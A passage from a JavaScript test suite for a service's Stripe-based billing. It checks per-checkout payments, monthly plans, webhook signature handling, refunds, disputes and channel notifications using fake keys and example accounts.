    sqlRun(`UPDATE billing_lines SET due_at = due_at - ${4 * 86400000} WHERE order_no = 'TB-1001'`);
    const st = await billOf(tessKey);
    assert.equal(st.lines.find((l) => l.orderNo === "TB-1001").state, "overdue");
    assert.deepEqual([st.overdue, st.block], [1000, { reason: "overdue", text: "1 checkout overdue: $10." }]);
    const r = await submit(tessKey, [ownFile([["Tess Own", "tess.own@example.com"]])], { on: 3 });
    assert.equal(r.status, 402);
    assert.deepEqual(await r.json(), { error: "1 checkout overdue: $10.", billing: { reason: "overdue", due: 1000, overdue: 1000, n: 1 } });
  });
  let pay1;
  await test("Pay opens one Stripe Checkout session for what's owed; asking again gives the same one", async () => {
    const n0 = sx.sessions.size;
    const r = await checkout(tessKey, { kind: "pay", web: "https://app.fafoaco.com", on: 3 });
    assert.equal(r.status, 200, JSON.stringify(r.body));
    pay1 = r.body;
    assert.deepEqual([pay1.amount, pay1.n], [1000, 1]); assert.match(pay1.url, /^https:\/\/checkout\.stripe\.test\/c\/pay\/cs_test_/);
    assert.equal(sx.sessions.size, n0 + 1);
    const cus = lastStripe("POST", "/v1/customers");
    assert.deepEqual(cus.params, { name: "tess", "metadata[fafo_license]": tessHash }); assert.equal(cus.idem, `cus:live:${tessHash}`);
    const c = lastStripe("POST", "/v1/checkout/sessions");
    tessCus = c.params.customer;
    assert.equal(c.auth, "Bearer fake_live_key_not_real"); assert.equal(c.version, "2026-09-30.endive"); assert.equal(c.idem, `pay:${pay1.pay}`);
    const expires = Number(c.params.expires_at);
    assert.ok(Math.abs(expires - (Date.now() / 1000 + 31 * 60)) < 120, "31 minutes");
    assert.deepEqual({ ...c.params, expires_at: 0 }, { mode: "payment", customer: tessCus, "line_items[0][price_data][currency]": "usd", "line_items[0][price_data][unit_amount]": "1000",
      "line_items[0][price_data][product_data][name]": "FAFO checkouts", "line_items[0][price_data][product_data][description]": "1 checkout: Target #TB-1001", "line_items[0][quantity]": "1",
      "payment_intent_data[metadata][fafo_pay]": pay1.pay, "allowed_payment_method_types[0]": "card", "allowed_payment_method_types[1]": "link", client_reference_id: pay1.pay,
      "metadata[fafo_license]": tessHash, "metadata[fafo_pay]": pay1.pay, success_url: `${BASE}/billing/done?s={CHECKOUT_SESSION_ID}&w=0`, cancel_url: `${BASE}/billing/done?c=1&w=0`, expires_at: 0 });
    const again = await checkout(tessKey, { kind: "pay" });
    assert.deepEqual(again.body, pay1); assert.equal(sx.sessions.size, n0 + 1, "no second session");
  });
  const sessionOf = (url) => sx.sessions.get(url.split("/").pop());
  await test("Stripe's webhook marks it paid and tells the channel once; a repeat changes nothing; a bad signature is refused", async () => {
    const s = sxPay(sessionOf(pay1.url).id), raw = event("checkout.session.completed", s), before = webhookPosts.length;
    const bad = [{ secret: "fake_other_secret_not_real" }, { header: null }, { header: "v1=abc" }, { t: Math.floor(Date.now() / 1000) - 301 }, { header: "t=1,v1=" }];
    for (const o of bad) { const r = await hookAt(raw, o); assert.equal(r.status, 400, JSON.stringify(o)); await r.text(); }
    assert.equal((await billOf(tessKey)).owed, 1000, "nothing changed");
    const r = await hookAt(raw);
    assert.equal(r.status, 200); assert.deepEqual(await r.json(), { received: true });
    const st = await billOf(tessKey);
    assert.deepEqual([st.lines.find((l) => l.orderNo === "TB-1001").state, st.owed, st.overdue, st.block], ["paid", 0, 0, null]);
    assert.deepEqual(st.payments.find((p) => p.id === pay1.pay), { id: pay1.pay, kind: "pay", status: "paid", amount: 1000, refund: 0 });
    assert.equal(st.paid30, 1000);
    assert.deepEqual(posts(before), ["💳 **Tess** paid $10 for 1 checkout"]);
    assert.equal((await hookAt(raw)).status, 200);
    assert.equal(webhookPosts.length, before + 1, "the same event again: nothing");
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM billing_events WHERE type = 'checkout.session.completed'`)[0].n, 1, "logged");
    const n = stripeCalls.length;
    assert.equal((await hookAt(event("checkout.session.completed", s, { livemode: false }))).status, 200);
    assert.equal(stripeCalls.length, n, "a test-mode event is no business of live mode");
    await alerts([billEv({ orderNo: "TB-1001", stage: "canceled" })]);
    assert.equal((await lineOf(tessKey, "TB-1001")).state, "paid", "canceled after it was paid: stays paid (refunds are the owner's, in Stripe)");
  });
  await test("a checkout canceled while its session is open expires the session; the rest is paid in a new one", async () => {
    await alerts([billEv({ orderNo: "TB-2001" }), billEv({ orderNo: "TB-2002" })]);
    const p = await checkout(tessKey, { kind: "pay" });
    assert.deepEqual([p.status, p.body.amount, p.body.n], [200, 2000, 2]);
    await alerts([billEv({ orderNo: "TB-2001", stage: "canceled" })]);
    await new Promise((ok) => setTimeout(ok, 600));
    assert.equal(sessionOf(p.body.url).status, "expired", "Stripe was told");
    const st = await billOf(tessKey);
    assert.equal(st.payments.find((x) => x.id === p.body.pay).status, "expired");
    assert.deepEqual([st.lines.find((l) => l.orderNo === "TB-2002").state, st.owed], ["due", 1000], "the other is still owed");
    const p2 = await checkout(tessKey, { kind: "pay" });
    assert.deepEqual([p2.body.amount, p2.body.n], [1000, 1]); assert.notEqual(p2.body.url, p.body.url);
  });
  await test("a session paid after one of its checkouts was canceled refunds that $10", async () => {
    await alerts([billEv({ orderNo: "TB-3001" })]);
    const p = await checkout(tessKey, { kind: "pay" });
    assert.deepEqual([p.body.amount, p.body.n], [2000, 2], "a new session for both (the old one is expired first)");
    const s = sxPay(sessionOf(p.body.url).id);
    await alerts([billEv({ orderNo: "TB-3001", stage: "canceled" })]);
    await new Promise((ok) => setTimeout(ok, 400));
    assert.equal(s.status, "complete", "too late to expire");
    const before = webhookPosts.length;
    assert.equal(await hook("checkout.session.completed", s), 200);
    const st = await billOf(tessKey);
    assert.deepEqual([st.lines.find((l) => l.orderNo === "TB-2002").state, st.lines.find((l) => l.orderNo === "TB-3001").state, st.owed], ["paid", "canceled", 0]);
    assert.deepEqual(st.payments.find((x) => x.id === p.body.pay), { id: p.body.pay, kind: "pay", status: "paid", amount: 2000, refund: 1000 });
    const re = sx.refunds.at(-1);
    assert.deepEqual([re.amount, re.payment_intent, re.metadata.fafo_pay], [1000, s.payment_intent, p.body.pay]);
    assert.equal(lastStripe("POST", "/v1/refunds").idem, `refund:${p.body.pay}`);
    assert.deepEqual(posts(before), ["💳 **Tess** paid $20 for 1 checkout · refunded $10 for 1 canceled, waived or already paid"]);
    assert.equal(await hook("checkout.session.completed", s), 200);
    assert.equal(sx.refunds.filter((x) => x.payment_intent === s.payment_intent).length, 1, "refunded once");
  });
  await test("an expired session leaves its checkouts owed", async () => {
    await alerts([billEv({ orderNo: "TB-4001" })]);
    const p = await checkout(tessKey, { kind: "pay" }), s = sessionOf(p.body.url);
    Object.assign(s, { status: "expired", url: null });
    assert.equal(await hook("checkout.session.expired", s), 200);
    const st = await billOf(tessKey);
    assert.deepEqual([st.payments.find((x) => x.id === p.body.pay).status, st.lines.find((l) => l.orderNo === "TB-4001").state, st.owed], ["expired", "due", 1000]);
  });
  let sub1;
  await test("the monthly plan needs how many slots are on, and no more than it covers (409)", async () => {
    assert.equal((await checkout(tessKey, { kind: "monthly", extras: 0 })).status, 400);
    const r = await checkout(tessKey, { kind: "monthly", extras: 0, on: 12 });
    assert.deepEqual([r.status, r.body.on, r.body.slots], [409, 12, 10]); assert.match(r.body.error, /Switch 2 off/);
    assert.deepEqual((await checkout(tessKey, { kind: "monthly", extras: 1, on: 26 })).body.slots, 25);
    assert.equal((await checkout(tessKey, { kind: "monthly", extras: 2, on: 2 })).status, 400, "one extra 15 at most");
  });
  await test("subscribing: Stripe's prices are made once, the plan starts once Stripe says so, and the limit is the plan's 10", async () => {
    const before = webhookPosts.length;
    const m = await checkout(tessKey, { kind: "monthly", extras: 0, on: 3 });
    assert.equal(m.status, 200, JSON.stringify(m.body)); assert.deepEqual(Object.keys(m.body).sort(), ["pay", "url"]);
    const lookup = lastStripe("GET", "/v1/prices");
    assert.deepEqual(lookup.params, { "lookup_keys[0]": "fafo_monthly_base", "lookup_keys[1]": "fafo_monthly_extra", limit: "10" });
    assert.deepEqual(stripeCalls.filter((c) => c.path === "/v1/products").map((c) => c.params), [{ id: "fafo_monthly", name: "FAFO monthly plan (10 slots)" }, { id: "fafo_extra_slots", name: "FAFO extra 15 slots" }]);
    const made = stripeCalls.filter((c) => c.method === "POST" && c.path === "/v1/prices").map((c) => c.params);
    assert.deepEqual(made, [{ product: "fafo_monthly", unit_amount: "2500", currency: "usd", "recurring[interval]": "month", lookup_key: "fafo_monthly_base" },
      { product: "fafo_extra_slots", unit_amount: "2500", currency: "usd", "recurring[interval]": "month", lookup_key: "fafo_monthly_extra" }]);
    const base = [...sx.prices.values()].find((x) => x.lookup_key === "fafo_monthly_base").id;
    const c = lastStripe("POST", "/v1/checkout/sessions");
    assert.deepEqual({ ...c.params, expires_at: 0 }, { mode: "subscription", customer: tessCus, "line_items[0][price]": base, "line_items[0][quantity]": "1",
      "subscription_data[metadata][fafo_license]": tessHash, "allowed_payment_method_types[0]": "card", "allowed_payment_method_types[1]": "link", client_reference_id: m.body.pay,
      "metadata[fafo_license]": tessHash, "metadata[fafo_pay]": m.body.pay, success_url: `${BASE}/billing/done?s={CHECKOUT_SESSION_ID}`, cancel_url: `${BASE}/billing/done?c=1`, expires_at: 0 });
    assert.equal((await billOf(tessKey)).plan, "checkout", "nothing until Stripe says so");
    sub1 = sxSubscribe(sessionOf(m.body.url).id);
    assert.equal(await hook("checkout.session.completed", sessionOf(m.body.url)), 200);
    const st = await billOf(tessKey);
    assert.equal(st.plan, "monthly");
    assert.deepEqual({ ...st.sub, periodEnd: 0 }, { status: "active", cancelAtEnd: false, extras: 0, paused: false, periodEnd: 0, slots: 10 });
    assert.equal(st.sub.periodEnd, sub1.items.data[0].current_period_end * 1000);
    assert.equal(st.payments.find((x) => x.id === m.body.pay).status, "paid");
    assert.deepEqual(posts(before), ["🗓️ **Tess** started the monthly plan (10 slots)"]);
    assert.deepEqual(await (await api("/slots/limit", tessKey)).json(), { limit: 10, request: null, canRequest: false, plan: "monthly" });
    const req = await api("/slots/request", tessKey, { requested: 30 });
    assert.equal(req.status, 409); assert.deepEqual(await req.json(), { error: "Add 15 slots in Invoice" });
    assert.equal(await hook("customer.subscription.created", sub1), 200);
    assert.equal(webhookPosts.length, before + 1, "told once");
  });
  await test("on the monthly plan: more slots on than it has are refused (402); checkouts it covers aren't billed", async () => {
    const own = [ownFile([["Tess Own", "tess.own@example.com"]]), loginsFile(["tess.own@example.com"])];
    const r = await submit(tessKey, own, { on: 11 });
    assert.equal(r.status, 402);
    assert.deepEqual(await r.json(), { error: "Your plan has 10 slots. Switch 1 off first.", billing: { reason: "over-limit", slots: 10, on: 11 } });
    const many = await submit(tessKey, [ownFile(Array.from({ length: 11 }, (_, i) => [`Tess M${i}`, `tess.m${i}@example.com`]))], { on: 2 });
    assert.equal(many.status, 402, "a batch bigger than the plan");
    assert.equal((await submit(tessKey, own, { on: 2, name: "Tess" })).status, 200);
    const n = (await billOf(tessKey)).lines.length;
    await alerts([billEv({ orderNo: "TB-5001" })]);
    assert.equal((await billOf(tessKey)).lines.length, n, "covered by the plan");
  });
  await test("the extra 15 slots: added (charged now), refused while too many are on, removed; a declined card says so", async () => {
    const before = webhookPosts.length;
    const add = await checkout(tessKey, { kind: "extras", extras: 1, on: 12 });
    assert.equal(add.status, 200, JSON.stringify(add.body));
    const extra = [...sx.prices.values()].find((x) => x.lookup_key === "fafo_monthly_extra").id;
    assert.deepEqual(lastStripe("POST", `/v1/subscriptions/${sub1.id}`).params, { "items[0][price]": extra, "items[0][quantity]": "1", proration_behavior: "always_invoice", payment_behavior: "pending_if_incomplete" });
    assert.deepEqual([add.body.sub.extras, add.body.sub.slots], [1, 25]);
    assert.equal((await (await api("/slots/limit", tessKey)).json()).limit, 25);
    assert.deepEqual(posts(before), ["🗓️ **Tess**'s monthly plan is now 25 slots"]);
    const no = await checkout(tessKey, { kind: "extras", extras: 0, on: 12 });
    assert.deepEqual([no.status, no.body.slots], [409, 10]);
    const rm = await checkout(tessKey, { kind: "extras", extras: 0, on: 5 });
    assert.equal(rm.status, 200);
    const item = lastStripe("POST", `/v1/subscriptions/${sub1.id}`).params;
    assert.deepEqual(Object.keys(item).sort(), ["items[0][deleted]", "items[0][id]", "proration_behavior"]); assert.equal(item.proration_behavior, "create_prorations");
    assert.equal(rm.body.sub.slots, 10);
    sx.declineNext = true;
    const d = await checkout(tessKey, { kind: "extras", extras: 1, on: 5 });
    assert.deepEqual([d.status, d.body], [402, { error: "Your card was declined." }]);
    assert.equal((await billOf(tessKey)).sub.slots, 10);
    sx.pendingNext = true;
    const p = await checkout(tessKey, { kind: "extras", extras: 1, on: 5 });
    assert.equal(p.status, 200); assert.match(p.body.url, /^https:\/\/invoice\.stripe\.test\/i\//, "a card that needs the buyer: its invoice's page");
    assert.equal((await billOf(tessKey)).sub.slots, 10, "not until it's paid");
  });
  await test("a renewal covers its month only once it's paid; one that fails turns Submit off (402); checkouts meanwhile wait, and are covered once it's paid", async () => {
    const before = webhookPosts.length, paidThrough = Date.now() - 2 * 86400000;
    // The first month was paid through two days ago (it began 32 days ago), and Stripe has just renewed the plan: the
    // subscription is still active, and the new month's invoice is a draft until it's charged, about an hour later.
    sqlRun(`UPDATE billing_subs SET paid_through = ${paidThrough}, period_end = ${paidThrough}, started_at = ${Date.now() - 32 * 86400000} WHERE sub_id = '${sub1.id}'`);
    for (const i of sx.invoices.values()) if (i.subscription === sub1.id && i.status === "open") i.status = "void";   // the extra slots' unpaid one
    const renewal = sxRenew(sub1, 28);
    const subRow = () => dbRows(`SELECT paid_through, period_end, invoice_status FROM billing_subs WHERE sub_id = '${sub1.id}'`)[0];
    const st0 = await billOf(tessKey);   // its period has ended: asked again (the lazy check)
    assert.deepEqual([subRow().paid_through, subRow().period_end, subRow().invoice_status, st0.block], [paidThrough, sub1.items.data[0].current_period_end * 1000, "draft", null]);
    assert.equal(await hook("customer.subscription.updated", sub1), 200);
    assert.equal(subRow().paid_through, paidThrough, "not paid for yet, by the webhook either");
    await alerts([billEv({ orderNo: "TB-6001" })]);
    assert.equal((await lineOf(tessKey, "TB-6001")).state, "held", "a checkout while it's being paid waits for it");
    // The charge fails.
    sub1.status = "past_due"; renewal.status = "open";
    assert.equal(await hook("invoice.payment_failed", { id: renewal.id, object: "invoice", parent: { type: "subscription_details", subscription_details: { subscription: sub1.id } } }), 200);
    assert.equal(subRow().paid_through, paidThrough);
    const st = await billOf(tessKey);
    assert.deepEqual([st.sub.status, st.block], ["past_due", { reason: "past-due", text: "Your monthly payment didn't go through." }]);
    assert.deepEqual(posts(before), ["⚠️ **Tess**'s monthly payment failed · about 2 slots out"]);
    const r = await submit(tessKey, [ownFile([["Tess Own", "tess.own@example.com"]])], { on: 2 });
    assert.equal(r.status, 402); assert.equal((await r.json()).billing.reason, "past-due");
    const owed = st.owed;
    await alerts([billEv({ orderNo: "TB-6002" })]);
    const held = await billOf(tessKey);
    assert.deepEqual([held.lines.find((l) => l.orderNo === "TB-6002").state, held.owed], ["held", owed], "on hold, not owed");
    const now = await checkout(tessKey, { kind: "invoice" });
    assert.deepEqual(now.body, { url: renewal.hosted_invoice_url });
    // Paid on Stripe's page; without its webhook, the next check a minute later sees it.
    renewal.status = "paid"; sub1.status = "active";
    sqlRun(`UPDATE billing_subs SET synced_at = synced_at - 61000 WHERE sub_id = '${sub1.id}'`);
    const ok = await billOf(tessKey);
    assert.deepEqual([ok.lines.find((l) => l.orderNo === "TB-6001").state, ok.lines.find((l) => l.orderNo === "TB-6002").state, ok.block, ok.sub.status], ["canceled", "canceled", null, "active"]);
    assert.deepEqual(dbRows("SELECT cancel_src FROM billing_lines WHERE order_no IN ('TB-6001', 'TB-6002')").map((x) => x.cancel_src), ["covered", "covered"]);
    assert.equal(subRow().paid_through, sub1.items.data[0].current_period_end * 1000, "paid through the new month");
    assert.equal(await hook("invoice.paid", { id: renewal.id, object: "invoice", parent: { type: "subscription_details", subscription_details: { subscription: sub1.id } } }), 200);
    assert.equal((await lineOf(tessKey, "TB-6001")).state, "canceled");
  });
  await test("ending the plan: set to end (and back), then pay per checkout once it ends", async () => {
    const before = webhookPosts.length;
    const c1 = await checkout(tessKey, { kind: "cancel", then: "checkout" });
    assert.deepEqual([c1.status, c1.body.nextPlan, c1.body.sub.cancelAtEnd], [200, "checkout", true]);
    assert.equal(lastStripe("POST", `/v1/subscriptions/${sub1.id}`).params.cancel_at_period_end, "true");
    const back = await checkout(tessKey, { kind: "resume" });
    assert.deepEqual([back.body.nextPlan, back.body.sub.cancelAtEnd], [null, false]);
    await checkout(tessKey, { kind: "cancel", then: "checkout" });
    assert.ok(posts(before).every((m) => m.startsWith("🗓️ **Tess**'s monthly plan will end <t:")), JSON.stringify(posts(before)));
    Object.assign(sub1, { status: "canceled", ended_at: sxNow() });
    const n = webhookPosts.length;
    assert.equal(await hook("customer.subscription.deleted", sub1), 200);
    const st = await billOf(tessKey);
    assert.deepEqual([st.plan, st.nextPlan, st.sub, st.block], ["checkout", null, null, null]);
    assert.deepEqual(posts(n), ["🗓️ **Tess**'s monthly plan ended · pay per checkout · about 2 slots out"]);
    assert.deepEqual(await (await api("/slots/limit", tessKey)).json().then((x) => [x.limit, x.canRequest]), [20, true], "back to the limit they had");
  });
  let sub2;
  await test("a second monthly plan made alongside the first is canceled at once, and the channel hears", async () => {
    const m = await checkout(tessKey, { kind: "monthly", extras: 0, on: 2 });
    sub2 = sxSubscribe(sessionOf(m.body.url).id);
    assert.equal(await hook("checkout.session.completed", sessionOf(m.body.url)), 200);
    assert.equal((await billOf(tessKey)).plan, "monthly");
    const dup = await checkout(tessKey, { kind: "monthly", extras: 0, on: 2 });
    assert.deepEqual([dup.status, dup.body.error, dup.body.plan], [409, "You already have a monthly plan.", "monthly"]);
    const before = webhookPosts.length;
    const sub3 = sxSub(tessCus, [[...sx.prices.values()].find((x) => x.lookup_key === "fafo_monthly_base").id], { fafo_license: tessHash });
    assert.equal(await hook("customer.subscription.created", sub3), 200);
    assert.equal(sub3.status, "canceled");
    assert.equal(lastStripe("DELETE", `/v1/subscriptions/${sub3.id}`).idem, `dupcancel:${sub3.id}`);
    assert.deepEqual(posts(before), ["⚠️ **Tess** paid for a second monthly plan; it was canceled. Refund its first payment in Stripe."]);
    assert.equal(await hook("customer.subscription.deleted", sub3), 200);
    assert.equal(webhookPosts.length, before + 1, "told once");
    const st = await billOf(tessKey);
    assert.deepEqual([st.plan, st.sub.status], ["monthly", "active"], "the first one stays");
  });
  await test("switching to pay per checkout ends a paid-up monthly plan at its period's end", async () => {
    const r = await (await api("/billing/plan", tessKey, { plan: "checkout" })).json();
    assert.deepEqual([r.plan, r.nextPlan, r.sub.cancelAtEnd], ["monthly", "checkout", true]);
    assert.match(r.message, /^Your monthly plan ends \d{4}-\d\d-\d\d; after that you pay per checkout\.$/);
    await checkout(tessKey, { kind: "resume" });
  });
  let umaBatch1;
  await test("their own accounts: a checkout their FAFO reports is billed only while that account was out as a slot", async () => {
    umaKey = await newBuyer("uma"); umaHash = hashOf(umaKey);
    await api("/billing/plan", umaKey, { plan: "checkout" });
    umaBatch1 = "ub" + rid();
    assert.equal((await submit(umaKey, [ownFile([["Uma One", "uma.one@example.com"], ["Uma Both", "both.own@example.com"]]), loginsFile(["uma.one@example.com", "both.own@example.com"])], { name: "Uma", on: 2, batch: umaBatch1 })).status, 200);
    const order = (o) => ({ account: "Uma.One@example.com", store: "target", orderNo: "uo-1", at: today, stage: "placed", item: "Sample ETB", qty: "1", ...o });
    const report = async (orders) => (await api("/billing/checkouts", umaKey, { orders })).json();
    const old = new Date(Date.now() - 3 * 86400000).toISOString().slice(0, 10);
    assert.deepEqual(await report([order(), order({ account: "never.sent@example.com", orderNo: "UO-X1" }), order({ store: "pokemoncenter", orderNo: "UO-X2" }), order({ at: old, orderNo: "UO-X3" }), order({ stage: "shipped", orderNo: "UO-X4" })]),
      { ok: true, added: 1, canceled: 0, ignored: 4 });
    assert.deepEqual(await report([order()]), { ok: true, added: 0, canceled: 0, ignored: 1 }, "the same report again adds nothing");
    assert.deepEqual(await report([order({ orderNo: "UO-2", stage: "canceled" }), order({ orderNo: "UO-2" })]), { ok: true, added: 1, canceled: 1, ignored: 0 }, "placed first, then canceled");
    const st = await billOf(umaKey);
    const l = st.lines.find((x) => x.orderNo === "UO-1");
    assert.deepEqual([l.source, l.state, l.acctHash, l.disputable, l.item, st.lines.find((x) => x.orderNo === "UO-2").state], ["buyer", "due", acctOf("uma.one@example.com"), true, "Sample ETB", "canceled"]);
    assert.deepEqual(st.report.accts.slice().sort(), [acctOf("both.own@example.com"), acctOf("uma.one@example.com")].sort());
    assert.ok(st.report.from <= today, "from when they first went out");
    assert.equal((await api("/billing/checkouts", umaKey, { orders: [] })).status, 400);
    assert.equal((await api("/billing/checkouts", umaKey, { orders: Array.from({ length: 201 }, () => order()) })).status, 400);
  });
  await test("disputing a checkout their FAFO reported: owed, never overdue, until the owner answers; the channel gets a link", async () => {
    const l = await lineOf(umaKey, "UO-1"), before = webhookPosts.length;
    const r = await api("/billing/dispute", umaKey, { id: l.id, note: "Not a slot I sent\nfrom FAFO" });
    assert.equal(r.status, 200);
    const st = await r.json();
    assert.deepEqual([st.lines.find((x) => x.orderNo === "UO-1").state, st.owed], ["disputed", 1000]);
    const m = posts(before);
    assert.equal(m.length, 1);
    assert.match(m[0], new RegExp(`^❓ \\*\\*Uma\\*\\* says Target #UO-1 \\(${today}\\) wasn't your checkout: "Not a slot I sent from FAFO" · \\[Answer\\]\\(${BASE}/billing/list/[A-Za-z0-9_-]+\\?t=[A-Za-z0-9_-]+&b=${umaHash.slice(0, 16)}\\)$`));
    assert.equal((await api("/billing/dispute", umaKey, { id: l.id, note: "again" })).status, 409, "once");
    assert.equal((await api("/billing/dispute", tessKey, { id: (await lineOf(tessKey, "TB-4001")).id })).status, 409, "only a line their FAFO reported");
    sqlRun(`UPDATE billing_lines SET due_at = due_at - ${5 * 86400000} WHERE order_no = 'UO-1'`);
    const late = await billOf(umaKey);
    assert.deepEqual([late.lines.find((x) => x.orderNo === "UO-1").state, late.overdue, late.block], ["disputed", 0, null]);
  });
  await test("a pulled slot's own account stops being billed after the pull (once the owner is told); a declined batch's never is", async () => {
    const slots = [{ store: "Target", profile: "Uma One", email: "uma.one@example.com", card: "Visa 4242" }];
    // A pull the owner never hears of (for a key nothing was sent to, or one that couldn't be posted) closes nothing.
    const unsent = await api("/pull", umaKey, { keyId: "0000-0000", name: "Uma", batch: "up" + rid(), slots });
    assert.deepEqual(await unsent.json(), { ok: true, forwarded: false });
    webhookFail.push(500);
    assert.equal((await api("/pull", umaKey, { keyId: "CSV", name: "Uma", batch: "up" + rid(), slots })).status, 502);
    assert.equal(windowsOf(umaBatch1).find((x) => x.profile === "Uma One").pulled_at, null, "still out");
    const pull = await api("/pull", umaKey, { keyId: "CSV", name: "Uma", batch: "up" + rid(), slots });
    assert.equal(pull.status, 200);
    assert.ok(windowsOf(umaBatch1).find((x) => x.profile === "Uma One").pulled_at > 0, "closed by the slot's store and profile");
    const later = new Date(Date.now() + 2 * 86400000).toISOString().slice(0, 10);
    const report = async (o) => (await api("/billing/checkouts", umaKey, { orders: [{ account: "uma.one@example.com", store: "target", orderNo: "UO-3", at: today, stage: "placed", ...o }] })).json();
    assert.equal((await report({ at: later, orderNo: "UO-LATE" })).added, 0, "after the pull");
    assert.equal((await report({})).added, 1, "the day of the pull");
    const before = webhookPosts.length, batch = "ud" + rid();
    assert.equal((await submit(umaKey, [ownFile([["Uma Two", "uma.two@example.com"]]), loginsFile(["uma.two@example.com"])], { name: "Uma", on: 3, batch })).status, 200);
    assert.equal(windowsOf(batch).length, 1);
    assert.equal((await report({ account: "uma.two@example.com", orderNo: "UO-W" })).added, 1, "reported while the batch waited");
    const link = approveLink(webhookPosts.slice(before).find((x) => x.content.startsWith("📦")).content);
    await (await fetchOnce(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), action: "decline" }) })).text();
    assert.deepEqual(windowsOf(batch), [], "declined: as if it never went out");
    assert.equal((await lineOf(umaKey, "UO-W")).state, "canceled", "and what was reported on it meanwhile comes off");
    assert.deepEqual(dbRows("SELECT cancel_src FROM billing_lines WHERE order_no = 'UO-W'"), [{ cancel_src: "declined" }]);
    assert.equal((await report({ account: "uma.two@example.com", orderNo: "UO-4" })).added, 0);
    assert.ok(!(await billOf(umaKey)).report.accts.includes(acctOf("uma.two@example.com")));
  });
  let umaAcct, umaPay;
  await test("an assigned account's slot pulled: orders on it after the pull aren't billed, though the alert still goes", async () => {
    const batch = "ua" + rid();
    assert.equal((await submit(umaKey, [ownFile([["Uma Given", ""]], 1)], { name: "Uma", on: 3, batch })).status, 200);
    umaAcct = dbRows(`SELECT email FROM accounts WHERE key_hash = '${umaHash}' AND store = 'target' AND profile = 'Uma Given'`)[0].email;
    assert.equal((await api("/pull", umaKey, { keyId: "CSV", name: "Uma", batch: "up" + rid(), slots: [{ store: "Target", profile: "Uma Given", email: "Assigned account", storeKey: "target" }] })).status, 200);
    assert.deepEqual(dbRows(`SELECT store, profile, batch FROM billing_pulled WHERE key_hash = '${umaHash}'`), [{ store: "target", profile: "Uma Given", batch }]);
    const later = new Date(Date.now() + 2 * 86400000).toISOString().slice(0, 10);
    assert.equal((await alerts([billEv({ account: umaAcct, orderNo: "UG-LATE", at: later })])).sent, 1);
    assert.equal(await lineOf(umaKey, "UG-LATE"), undefined);
    await alerts([billEv({ account: umaAcct, orderNo: "UG-1" })]);
    assert.equal((await lineOf(umaKey, "UG-1")).source, "alert", "the day of the pull still counts");
    // Uma pays what's owed (not the disputed one). One was written when a checkout cost $12 (as if the price changed since):
    // each is paid at its own amount, one Stripe line per amount.
    sqlRun("UPDATE billing_lines SET amount = 1200 WHERE order_no = 'UG-1'");
    const p = await checkout(umaKey, { kind: "pay" });
    assert.deepEqual([p.body.n, p.body.amount], [2, 2200], "UO-3 and UG-1; the disputed one waits");
    const items = lastStripe("POST", "/v1/checkout/sessions").params;
    assert.deepEqual([items["line_items[0][price_data][unit_amount]"], items["line_items[0][quantity]"], items["line_items[0][price_data][product_data][description]"],
      items["line_items[1][price_data][unit_amount]"], items["line_items[1][quantity]"], items["line_items[1][price_data][product_data][description]"]],
      ["1000", "1", "1 checkout: Target #UO-3", "1200", "1", "1 checkout: Target #UG-1"]);
    const s = sxPay(sessionOf(p.body.url).id);
    assert.equal(s.amount_total, 2200);
    const before = webhookPosts.length;
    assert.equal(await hook("checkout.session.completed", s), 200);
    const st = await billOf(umaKey);
    assert.deepEqual([st.lines.find((l) => l.orderNo === "UO-3").state, st.lines.find((l) => l.orderNo === "UG-1").state, st.payments.find((x) => x.id === p.body.pay).refund], ["paid", "paid", 0]);
    assert.deepEqual(posts(before), ["💳 **Uma** paid $22 for 2 checkouts"]);
    umaPay = { ...p.body, pi: s.payment_intent };
  });
  await test("a Stripe customer deleted in the Dashboard is made again, with a new idempotency key (or Stripe would answer with the one that's gone)", async () => {
    const old = dbRows(`SELECT customer_id FROM billing WHERE key_hash = '${umaHash}' AND mode = 'live'`)[0].customer_id;
    sx.customers.delete(old);
    const m = await checkout(umaKey, { kind: "monthly", extras: 0, on: 3 });
    assert.equal(m.status, 200, JSON.stringify(m.body));
    const cus = lastStripe("POST", "/v1/customers");
    assert.equal(cus.idem, `cus:live:${umaHash}:1`);
    const now = dbRows(`SELECT customer_id FROM billing WHERE key_hash = '${umaHash}' AND mode = 'live'`)[0].customer_id;
    assert.ok(now !== old && sx.customers.has(now) && sessionOf(m.body.url).customer === now);
    Object.assign(sessionOf(m.body.url), { status: "expired", url: null });
    assert.equal(await hook("checkout.session.expired", sessionOf(m.body.url)), 200);
  });
  await test("a card payment disputed with the bank turns Submit off until the owner clears it; refunds made in Stripe are told", async () => {
    const before = webhookPosts.length;
    const dispute = { id: "dp_sample1", object: "dispute", charge: "ch_sample1", payment_intent: umaPay.pi, amount: 2000, status: "needs_response" };
    assert.equal(await hook("charge.dispute.created", dispute), 200);
    const st = await billOf(umaKey);
    assert.deepEqual(st.block, { reason: "disputed-payment", text: "A payment is disputed with your bank. Contact your seller." });
    assert.equal((await submit(umaKey, [ownFile([["Uma One", "uma.one@example.com"]])], { on: 3, name: "Uma" })).status, 402);
    assert.equal(await hook("charge.dispute.created", dispute), 200);
    assert.equal(await hook("charge.dispute.closed", { ...dispute, status: "won" }), 200);
    const m = posts(before);
    assert.equal(m.length, 3, JSON.stringify(m));
    assert.equal(m[0], "⚠️ **Uma** disputed $20 with their bank. Submit is off for them until you clear it on the Billing page.");
    assert.equal(m[1], "⛔ **Uma** tried to send 1 slot: a payment is disputed with their bank", "the refused batch");
    assert.match(m[2], /^⚖️ \*\*Uma\*\*'s dispute of \$20 was closed \(won\)\./, "and the dispute told once");
    const n = webhookPosts.length;
    sx.refunds.push({ id: "re_dashboard1", object: "refund", amount: 1000, payment_intent: umaPay.pi, metadata: {}, status: "succeeded", created: sxNow() });
    assert.equal(await hook("charge.refunded", { id: "ch_sample1", object: "charge", payment_intent: umaPay.pi, customer: null, amount_refunded: 1000 }), 200);
    assert.deepEqual(posts(n), ["↩️ Refunded $10 to **Uma**"]);
    const tessRefund = sx.refunds.find((x) => x.metadata.fafo_pay && x.amount === 1000 && x.payment_intent !== umaPay.pi);
    assert.equal(await hook("charge.refunded", { id: "ch_sample2", object: "charge", payment_intent: tessRefund.payment_intent, customer: tessCus, amount_refunded: 1000 }), 200);
    assert.equal(webhookPosts.length, n + 1, "not the worker's own refund");
  });
  let billLink;
  await test("the Billing page: only the owner's own FAFO asks for it; its link goes to the channel for 24 hours", async () => {
    const no = await api("/billing/list", tessKey, { name: "Tess" });
